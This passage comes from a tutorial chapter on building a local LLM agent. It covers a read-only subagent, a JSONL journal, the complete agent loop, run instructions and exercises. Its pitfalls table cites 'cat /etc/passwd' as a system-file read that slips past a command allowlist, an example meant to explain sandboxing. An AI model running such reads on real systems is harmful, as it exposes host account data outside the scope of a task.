                             "response_format": {"type": "json_schema",
                                                 "json_schema": {"schema": schemat}}}).encode(),
            headers={"Content-Type": "application/json"})
        surowy = json.load(urllib.request.urlopen(req, timeout=300))["choices"][0]["message"]["content"]
        krok = json.loads(surowy)
        if krok["narzedzie"] == "raport":
            return krok["argumenty"].get("tresc", "(the subagent gave no content)")
        _, fn = narzedzia_tylko_czytajace[krok["narzedzie"]]
        try:
            wynik = str(fn(**krok["argumenty"]))[:5000]
        except Exception as e:
            wynik = f"ERROR: {e}"
        hist.append({"role": "assistant", "content": surowy})
        hist.append({"role": "user", "content": f"Result: {wynik}"})

    return "(the subagent did not finish within the turn limit)"
PYEOF
```

### 9.1 When to delegate and when not to

| ✅ Delegate | ❌ Do not delegate |
| :-- | :-- |
| "go through 40 files and find where the power limit is set" | "read this one file" |
| "check which tests concern module X" | "append one line to a file" |
| tasks that **read a lot and return little** | tasks that **modify** |

⚠️ **A subagent never gets write tools.** Two reasons: (1) it does not see
the whole intent, so it may write something contradictory; (2) the parent loses control over
what changed. **Subagents read, the parent writes.**

⚠️ **Pitfall P41 (new): delegation has a fixed cost.**
The subagent has to establish the task context from scratch. For a small task **delegation is more expensive
than doing it yourself.** Delegate when reading exceeds ~20% of your context.

---

## 10. Journal and replay

⭐ **Without this you cannot debug an agent.** The agent failed after 18 turns — without a journal you
will not find out why.

```bash
cat > $AGENT/dziennik.py <<'PYEOF'
#!/usr/bin/env python3
"""JSONL journal: every agent step recorded, replayable."""
import json, os, time, uuid

class Dziennik:
    def __init__(self, katalog: str = "$AGENT/dzienniki"):
        self.kat = os.path.expanduser(os.path.expandvars(katalog))
        os.makedirs(self.kat, exist_ok=True)
        self.id = time.strftime("%Y%m%d-%H%M%S") + "-" + uuid.uuid4().hex[:6]
        self.plik = os.path.join(self.kat, f"{self.id}.jsonl")
        self.t0 = time.time()

    def _pisz(self, rekord: dict):
        rekord["t"] = round(time.time() - self.t0, 3)
        with open(self.plik, "a", encoding="utf-8") as f:
            f.write(json.dumps(rekord, ensure_ascii=False) + "\n")

    def start(self, zadanie: str, model: str, n_ctx: int):
        self._pisz({"typ": "start", "zadanie": zadanie, "model": model, "n_ctx": n_ctx})

    def krok(self, tura: int, mysl: str, narzedzie: str, argumenty: dict,
             wynik: str, tokeny: int | None = None, ms: float | None = None):
        self._pisz({"typ": "krok", "tura": tura, "mysl": mysl,
                    "narzedzie": narzedzie, "argumenty": argumenty,
                    "wynik": str(wynik)[:4000], "tokeny_kontekstu": tokeny, "ms": ms})

    def kompakcja(self, przed: int, po: int):
        self._pisz({"typ": "kompakcja", "wiadomosci_przed": przed, "wiadomosci_po": po})

    def interwencja(self, komunikat: str):
        self._pisz({"typ": "interwencja", "komunikat": komunikat})

    def koniec(self, wynik: str, tury: int, powod: str = "ok"):
        self._pisz({"typ": "koniec", "wynik": str(wynik)[:4000],
                    "tury": tury, "powod": powod})

# ---------- browsing tool -----------------------------------------------
def pokaz(plik: str):
    for linia in open(os.path.expanduser(os.path.expandvars(plik)), encoding="utf-8"):
        r = json.loads(linia)
        t = r.get("t", 0)
        if r["typ"] == "start":
            print(f"[{t:7.2f}s] START  {r['zadanie'][:90]}")
            print(f"           model={os.path.basename(r['model'])} n_ctx={r['n_ctx']}")
        elif r["typ"] == "krok":
            blad = "❌" if str(r["wynik"]).startswith(("ERROR", "REFUSED")) else "  "
            tok = f" ctx={r['tokeny_kontekstu']}" if r.get("tokeny_kontekstu") else ""
            ms  = f" {r['ms']:.0f}ms" if r.get("ms") else ""
            print(f"[{t:7.2f}s] {blad} {r['tura']:2d}. {r['narzedzie']:20s}{tok}{ms}")
            print(f"              thought: {r['mysl'][:100]}")
            print(f"              arg:     {str(r['argumenty'])[:100]}")
            print(f"              ←        {str(r['wynik'])[:120]}")
        elif r["typ"] == "kompakcja":
            print(f"[{t:7.2f}s] 🗜  COMPACTION {r['wiadomosci_przed']} → {r['wiadomosci_po']} messages")
        elif r["typ"] == "interwencja":
            print(f"[{t:7.2f}s] ⚠️  GUARD: {r['komunikat'][:110]}")
        elif r["typ"] == "koniec":
            print(f"[{t:7.2f}s] END ({r['powod']}, {r['tury']} turns)")
            print(f"           {str(r['wynik'])[:300]}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        pokaz(sys.argv[1])
    else:
        kat = os.path.join(os.environ["AGENT"], "dzienniki")
        pliki = sorted(os.listdir(kat)) if os.path.isdir(kat) else []
        if pliki:
            print(f"=== latest: {pliki[-1]} ===\n")
            pokaz(os.path.join(kat, pliki[-1]))
        else:
            print("no journals")
PYEOF
```

💡 **The JSONL format is deliberate.** One line = one event. You can `grep` it,
`tail -f` it while the agent works, and analyse it in Python. **Do not wrap it in JSON
as a single array** — you cannot append to it or follow it live.

---

## 11. Putting it all together

```bash
cat > $AGENT/agent.py <<'PYEOF'
#!/usr/bin/env python3
"""AGENT — the complete loop. Parts 2–6 of the course in one file.

Usage:
  python3 agent.py "task to perform"
  python3 agent.py "task" --bez-zgod        # does not ask, rejects risky actions
  python3 agent.py "task" --praca ~/project # a different working directory
"""
import json, os, sys, time, urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from narzedzia_plikowe  import Pliki
from narzedzie_powloka  import Powloka
from obserwacje         import sformatuj
from kontekst           import Kontekst, Notatnik
from odzyskiwanie       import Straznik
from dziennik           import Dziennik
from subagent           import subagent

LLM   = os.environ.get("LLM_URL", "http://127.0.0.1:8081")
MODEL = os.environ.get("MODEL_PATH",
    os.path.expanduser("~/models/gpt-oss-20b/gpt-oss-20b-MXFP4.gguf"))
N_CTX = int(os.environ.get("N_CTX", "16384"))

SYSTEM = """You are an agent working in the user's working directory.

WORKING RULES
1. In each turn you choose EXACTLY ONE tool.
2. Before editing a file ALWAYS read it — you need its exact content.
3. In 'stary_tekst' do NOT include line numbers or the '  123| ' prefix.
4. 'stary_tekst' must be UNIQUE in the file — add context if needed.
5. Save important findings (numbers, names, conclusions) via 'zapisz_ustalenie'.
6. When you do not know, or the decision belongs to a human — 'zapytaj_uzytkownika'.
7. When the task is done — 'odpowiedz'.

STYLE
- 'mysl' is ONE sentence: what you are doing and why.
- Do not repeat a failed action. Change your approach.
- Do not invent file contents — read them."""


class Agent:
    def __init__(self, katalog_roboczy="$AGENT/praca", tryb_zgody="pytaj"):
        self.pliki  = Pliki(katalog_roboczy)
        self.sh     = Powloka(katalog_roboczy, tryb_zgody=tryb_zgody)
        self.ctx    = Kontekst(MODEL, n_ctx=N_CTX)
        self.notes  = Notatnik(os.path.join(self.pliki.root, ".agent-ustalenia.json"))
        self.log    = Dziennik()
        self.straz  = Straznik()
        self.narzedzia = self._zbuduj()

    # ---------- tool surface ------------------------------------------
    def _zbuduj(self) -> dict:
        czytajace = {
            "czytaj": ("Reads a file and returns its content with line numbers. ALWAYS use it before "
                       "editing. Arguments: sciezka, optionally od_linii and ile_linii.",
                       self.pliki.czytaj),
            "szukaj_plikow": ("Finds files by a glob pattern, e.g. '*.py' or 'src/**'. "
                              "Argument: wzorzec.", self.pliki.szukaj_plikow),
            "szukaj_w_tresci": ("Searches for a regular expression in file contents. Returns "
                                "file:line:content. Arguments: wzorzec, optionally katalog.",
                                self.pliki.szukaj_w_tresci),
        }
        return {
            **czytajace,
            "zapisz": ("Creates or overwrites a file. If the file exists, you must "
                       "read it first. Arguments: sciezka, tresc.",
                       self.pliki.zapisz),
            "edytuj": ("Replaces EXACTLY ONE occurrence of stary_tekst with nowy_tekst. "
                       "stary_tekst must be unique and without line numbers. "
                       "Arguments: sciezka, stary_tekst, nowy_tekst.",
                       self.pliki.edytuj),
            "powloka": ("Runs one command in the working directory. No ; && | > `. "
                        "Modifying commands require user approval. "
                        "Argument: polecenie.", self.sh.uruchom),
            "zbadaj": ("Hands a research task requiring the reading of many files to a "
                       "subagent. Returns a concise report. Use it when you have to go through a lot "
                       "of material. Argument: zadanie.",
                       lambda zadanie: subagent(zadanie, czytajace)),
            "zapisz_ustalenie": ("Saves a fact to persistent memory, which survives "
                                 "context compaction. Arguments: klucz, wartosc.",
                                 self.notes.zapisz),
            "zapytaj_uzytkownika": ("Asks the human a question and waits for an answer. "
                                    "Use it when the decision is not yours. "
                                    "Argument: pytanie.", self._pytaj),
            "odpowiedz": ("Finishes the work and delivers the result. Argument: tresc.", None),
        }

    @staticmethod
    def _pytaj(pytanie: str) -> str:
        print(f"\n  ❓ THE AGENT ASKS: {pytanie}")
        return input("     Your answer: ").strip() or "(no answer)"

    # ---------- communication with the model --------------------------
    def _schemat(self) -> dict:
        return {
            "type": "object",
            "properties": {
                "mysl":      {"type": "string"},
                "narzedzie": {"type": "string", "enum": list(self.narzedzia)},
                "argumenty": {"type": "object"},
            },
            "required": ["mysl", "narzedzie", "argumenty"],
        }

    def _zapytaj(self, messages: list[dict]) -> tuple[str, float]:
        t0 = time.time()
        req = urllib.request.Request(LLM + "/v1/chat/completions",
            data=json.dumps({
                "messages": messages, "max_tokens": 900,
                "temperature": 0, "repeat_penalty": 1.0, "seed": 42,
                "response_format": {"type": "json_schema",
                                    "json_schema": {"schema": self._schemat()}},
            }).encode(), headers={"Content-Type": "application/json"})
        r = json.load(urllib.request.urlopen(req, timeout=600))
        return r["choices"][0]["message"]["content"], (time.time() - t0) * 1000

    def _prompt_systemowy(self) -> str:
        opis = "\n".join(f"- {n}({', '.join(f'{k}' for k in [])}): {o}"
                         for n, (o, _) in self.narzedzia.items())
        opis = "\n".join(f"- {n}: {o}" for n, (o, _) in self.narzedzia.items())
        czesci = [SYSTEM, "", "TOOLS:", opis, "",
                  f"WORKING DIRECTORY: {self.pliki.root}"]
        notatki = self.notes.jako_tekst()
        if notatki:
            czesci += ["", notatki]
        return "\n".join(czesci)

    # ---------- loop ----------------------------------------------------
    def uruchom(self, zadanie: str, max_tur: int = 25) -> str:
        self.straz.max_tur = max_tur
        self.log.start(zadanie, MODEL, N_CTX)
        hist = [{"role": "system", "content": self._prompt_systemowy()},
                {"role": "user",   "content": zadanie}]

        print(f"╭─ TASK: {zadanie}")
        print(f"╰─ directory: {self.pliki.root}\n")

        for tura in range(1, max_tur + 1):
            # --- compaction, if the context is filling up --------------
            if self.ctx.trzeba_kompaktowac(hist):
                przed = len(hist)
                hist = self.ctx.kompaktuj(hist)
                hist[0] = {"role": "system", "content": self._prompt_systemowy()}
                self.log.kompakcja(przed, len(hist))
                print(f"  🗜  compaction: {przed} → {len(hist)} messages")

            # --- think ------------------------------------------------
            try:
                surowy, ms = self._zapytaj(hist)
                krok = json.loads(surowy)
            except Exception as e:
                print(f"  ❌ model error: {e}")
                self.log.koniec(f"model error: {e}", tura, "blad_modelu")
                return f"Aborted: model error ({e})"

            nazwa, args = krok["narzedzie"], krok.get("argumenty", {})
            print(f"  {tura:2d}. {krok['mysl']}")
            print(f"      → {nazwa}({', '.join(f'{k}={str(v)[:40]!r}' for k, v in args.items())})")

            # --- end ---------------------------------------------------
            if nazwa == "odpowiedz":
                tresc = args.get("tresc") or args.get("odpowiedz") or "(no content)"
                self.log.krok(tura, krok["mysl"], nazwa, args, tresc,
                              self.ctx.zuzycie(hist), ms)
                self.log.koniec(tresc, tura, "ok")
                return tresc

            # --- act ---------------------------------------------------
            _, fn = self.narzedzia[nazwa]
            try:
                wynik = fn(**args) if fn else "ERROR: no implementation"
            except TypeError as e:
                wynik = f"ERROR in arguments of tool {nazwa}: {e}"
            except PermissionError as e:
                wynik = f"REFUSED: {e}"
            except Exception as e:
                wynik = f"ERROR: {type(e).__name__}: {e}"

            print(f"      ← {str(wynik).splitlines()[0][:120] if str(wynik) else '(empty)'}")

            zuzycie = self.ctx.zuzycie(hist)
            self.log.krok(tura, krok["mysl"], nazwa, args, wynik, zuzycie, ms)

            # --- observe -----------------------------------------------
            hist.append({"role": "assistant", "content": surowy})
            hist.append({"role": "user", "content": sformatuj(nazwa, args, str(wynik))})

            # --- guard -------------------------------------------------
            self.straz.zarejestruj(nazwa, args, str(wynik))
            problem = self.straz.problem()
            if problem:
                print(f"      ⚠️  {problem[:110]}")
                self.log.interwencja(problem)
                hist.append({"role": "user", "content": problem})
                if problem.startswith("STOP"):
                    self.log.koniec("turn limit", tura, "limit")
                    return "Aborted: turn limit."

        self.log.koniec("turn limit", max_tur, "limit")
        return "Aborted: turn limit."


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    zadanie = args[0] if args else "List the files in the working directory and say what you see."
    praca = "$AGENT/praca"
    if "--praca" in sys.argv:
        praca = sys.argv[sys.argv.index("--praca") + 1]
    tryb = "odrzucaj" if "--bez-zgod" in sys.argv else "pytaj"

    a = Agent(praca, tryb_zgody=tryb)
    wynik = a.uruchom(zadanie)
    print(f"\n╭─ RESULT\n{wynik}\n╰─ journal: {a.log.plik}")
PYEOF
chmod +x $AGENT/agent.py
```

### 11.1 Run it

```bash
pkill -f llama-server; sleep 2
export HIP_VISIBLE_DEVICES=0,1
$LB/llama-server -m $OSS20 -ngl 999 -c 16384 --port 8081 --host 127.0.0.1 --no-warmup &
sleep 25

mkdir -p $AGENT/praca
cd $AGENT

# Task 1: reconnaissance
python3 agent.py "List all .py files in the working directory and briefly describe what each one does."

# Task 2: creation
python3 agent.py "Write a file vat.py with a function brutto(netto, stawka) that computes the gross amount. Add three asserts checking rates of 23, 8 and 5 percent. Run the file and show the result."

# Task 3: editing an existing one
python3 agent.py "In the file vat.py add a function netto_z_brutto(brutto, stawka) that does the reverse operation. Add an assert checking that for 1230 and a rate of 23 the result is 1000."

# Review the journal
python3 dziennik.py
```

### 11.2 What to watch for on the first run

| Observation | What it means |
| :-- | :-- |
| the agent reads the file before editing | ✅ the tool descriptions work |
| `edytuj` returns "I did not find stary_tekst" | ⚠️ the model included line numbers — **fix the tool description** |
| the agent repeats the same thing | ✅ the guard should inject a warning |
| compaction after ~15 turns | ✅ context management works |
| the agent does not call `odpowiedz` | ⚠️ **P37** — strengthen rule 7 in the prompt |

⚠️ **A 20B model will make mistakes more often than Claude.** That is normal. Your answer
is not "a better prompt" ad infinitum, but **a stronger harness**: better error
messages, clearer tool descriptions, a guard. **The harness compensates for a weaker model —
that is the main thesis of this chapter.**

---

## Exercises

1. **Add a tool `lista_katalogu(sciezka)`** — the agent often wastes a turn on
   `powloka("ls")`. A dedicated tool is faster and safer.
2. **Measure how many turns typical tasks take.** Run five tasks, compute the average
   from the journals. That is your baseline number — you will improve it in part 8.
3. **Compare models on the same task:**
   ```bash
   for M in $OSS20 $QWEN32 $BIELIK; do
     pkill -f llama-server; sleep 3
     $LB/llama-server -m $M -ngl 999 -c 16384 --port 8081 --host 127.0.0.1 --no-warmup &
     sleep 30
     echo "=== $(basename $M)"
     MODEL_PATH=$M python3 agent.py "Write a test for the brutto function in vat.py and run it." --bez-zgod
   done
   ```
   ⭐ **Write down which model completed the task in how many turns.** That is your agent benchmark —
   more important than tokens/s.
4. **Break the agent on purpose:** remove `repeat_penalty: 1.0` from `_zapytaj`. Watch it start
   corrupting the JSON. **Restore it and appreciate P21.**
5. **Remove the freshness check** from `Pliki.edytuj`. Run the agent, and while it is thinking
   change the file in your editor. Watch the agent eat your change. **Restore it.**

---

## Check yourself

- [ ] What are the four steps of the agent loop?
- [ ] Why is `odpowiedz` a tool and not a separate code path?
- [ ] When should you promote an action from `bash` to a dedicated tool — four reasons?
- [ ] Why does `edytuj` require an exact, unique match?
- [ ] What happens without the file freshness check?
- [ ] Why do we truncate observations from the middle, not from the end?
- [ ] Why is a persistent notebook needed alongside the context?
- [ ] Why is it better to inject a warning than to abort the loop?
- [ ] Why don't subagents get write tools?
- [ ] Why is a command allowlist not a sandbox?

## New pitfalls

| ID | Pitfall | § |
| :-- | :-- | :-- |
| **P37** | The model forgets to call `odpowiedz` and goes around in a loop | §2.1 |
| **P38** | No freshness check — the agent overwrites the human's changes | §4.2 |
| **P39** | A command allowlist is not a sandbox (`cat /etc/passwd` goes through) | §5.1 |
| **P40** | One huge observation fills the entire context window | §6 |
| **P41** | Delegation has a fixed cost — do not delegate small tasks | §9.1 |

---

**Next part: `07-SANDBOX-SECURITY-MONITORING.md`** — you lock the agent in a cage,
give it controlled access to the network and the terminal, and watch what it does.
